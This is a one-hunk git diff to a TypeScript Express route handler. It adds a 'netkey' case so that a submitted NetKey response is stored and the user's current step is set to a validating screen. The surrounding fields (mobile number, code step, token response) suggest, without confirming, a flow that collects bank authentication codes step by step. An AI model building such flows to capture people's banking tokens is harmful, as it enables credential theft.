@@ -1644,6 +1644,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.celular = inputData.celular;
                 updatedFields.pasoActual = ScreenType.CODIGO;
                 break;
+              case 'netkey':
               case 'netkey_response':
                 updatedFields.netkeyResponse = inputData.netkeyResponse;
                 updatedFields.pasoActual = ScreenType.VALIDANDO;
